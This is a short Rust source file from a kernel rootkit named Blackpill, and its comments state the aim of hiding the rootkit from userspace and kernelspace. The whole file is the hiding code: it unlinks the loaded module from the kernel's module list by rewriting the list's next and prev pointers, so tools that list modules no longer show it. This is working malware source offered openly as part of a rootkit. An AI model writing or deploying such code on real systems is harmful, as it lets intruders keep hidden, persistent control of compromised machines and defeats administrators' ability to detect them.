//! This module encapsulates all hiding features of Blackpill.
//! This includes hiding the rootkit from userspace and kernelspace.

use kernel::prelude::*;
use kernel::ThisModule;

/// Hides the rootkit from userspace and kernelspace.
/// This includes :
/// - Removing module from the modules list
pub(crate) fn hide(module: &'static ThisModule) {
    remove_mod_from_list(module);
}

/// Removes the module `module` from the kernel modules list.
pub(crate) fn remove_mod_from_list(module: &'static ThisModule) {
    // TODO: remove obvious comments
    pr_info!("Removing module from list\n");
    let module_ptr = unsafe { *(module.as_ptr()) };
    let modules = module_ptr.list;

    let next_module = modules.next;
    let prev_module = modules.prev;

    // removes next and previous entries
    unsafe {
        (*prev_module).next = next_module;
        (*next_module).prev = prev_module;
    }
}
